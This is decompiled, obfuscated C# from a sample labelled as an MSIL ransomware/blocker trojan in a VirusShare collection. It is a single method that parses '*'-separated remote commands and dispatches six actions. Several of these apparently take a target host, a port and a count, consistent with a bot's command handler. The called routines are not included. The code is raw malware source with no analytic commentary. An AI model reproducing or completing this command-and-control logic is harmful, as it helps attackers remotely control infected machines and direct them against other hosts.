// Decompiled with JetBrains decompiler
// Type: .
// Assembly: System, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: BCD7F698-81A9-45B6-B776-A5010DB561F8
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-79d9011ecd8a8c2b249f5f7f02fc71d724d9db23b2ea3aa0a787370b0766ca61.exe

using \u0001\u000E\u0003\u0004;
using \u0001\u000E\u0003\u0004.\u0002\u0003\u0002\u000E\u0006\u000E.\u000A\u000B\u0005;
using System;
using System.Collections.Generic;

namespace \u0001\u000E\u0003\u0004
{
  internal class \u0011\u000D\u000F
  {
    public static void \u0024MD\u00242C(string _param0)
    {
      string[] strArray1 = new string[0];
      string[] strArray2 = _param0.Split('*');
      string key;
      if ((key = strArray2[0]) == null)
        return;
      // ISSUE: reference to a compiler-generated field
      if (\u003CPrivateImplementationDetails\u003E\u007B21E36A1B\u002DFEF4\u002D472B\u002DBE24\u002D98253D732F38\u007D.\u0011\u000B\u0008 == null)
      {
        // ISSUE: reference to a compiler-generated field
        \u003CPrivateImplementationDetails\u003E\u007B21E36A1B\u002DFEF4\u002D472B\u002DBE24\u002D98253D732F38\u007D.\u0011\u000B\u0008 = new Dictionary<string, int>(6)
        {
          {
            \u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u000F\u000E\u0004\u000B(),
            0
          },
          {
            \u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u0007\u0005\u000D(),
            1
          },
          {
            \u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u0007\u0010(),
            2
          },
          {
            \u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u0002\u0003(),
            3
          },
          {
            \u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u000E\u000C\u0009\u0009(),
            4
          },
          {
            \u003CPrivateImplementationDetails\u003E\u007BBCE1391D\u002DB4A1\u002D4042\u002DA852\u002DF45FBF2D78DE\u007D.\u000E\u0010\u000A\u0009(),
            5
          }
        };
      }
      int num;
      // ISSUE: reference to a compiler-generated field
      // ISSUE: explicit non-virtual call
      if (!__nonvirtual (\u003CPrivateImplementationDetails\u003E\u007B21E36A1B\u002DFEF4\u002D472B\u002DBE24\u002D98253D732F38\u007D.\u0011\u000B\u0008.TryGetValue(key, out num)))
        return;
      switch (num)
      {
        case 0:
          \u000C\u000E.\u000E\u0006\u000E\u0008(Convert.ToString(strArray2[1]));
          break;
        case 1:
          \u000C\u000E.\u000B\u0006\u000D\u000F(Convert.ToString(strArray2[1]));
          break;
        case 2:
          \u0005\u000C\u000F.\u0007\u000C\u0005\u0002\u0007(Convert.ToString(strArray2[1]));
          break;
        case 3:
          \u000B\u0005\u0002\u000C\u000D\u0004.\u000E\u000C = Convert.ToString(strArray2[1]);
          \u000B\u0005\u0002\u000C\u000D\u0004.\u000C = Convert.ToString(strArray2[2]);
          \u000B\u0005\u0002\u000C\u000D\u0004.\u000E\u0006\u000B\u0002 = ushort.Parse(strArray2[3]);
          \u000B\u0005\u0002\u000C\u000D\u0004.\u000E();
          break;
        case 4:
          \u000E.\u000B\u0006\u0007\u000E\u0001 = Convert.ToString(strArray2[1]);
          \u000E.\u0009\u0001\u0011\u000A = ushort.Parse(strArray2[2]);
          \u000E.\u0008\u0003\u0003\u000A\u000D();
          break;
        case 5:
          \u0002\u0009\u000D\u0009\u0010\u0005.\u000A\u0010\u0009 = Convert.ToString(strArray2[1]);
          \u0002\u0009\u000D\u0009\u0010\u0005.\u0002\u0006 = ushort.Parse(strArray2[2]);
          \u0002\u0009\u000D\u0009\u0010\u0005.\u0001\u000F\u000B = Convert.ToInt32(strArray2[3]);
          \u0002\u0009\u000D\u0009\u0010\u0005.\u0004\u0003();
          break;
      }
    }
  }
}
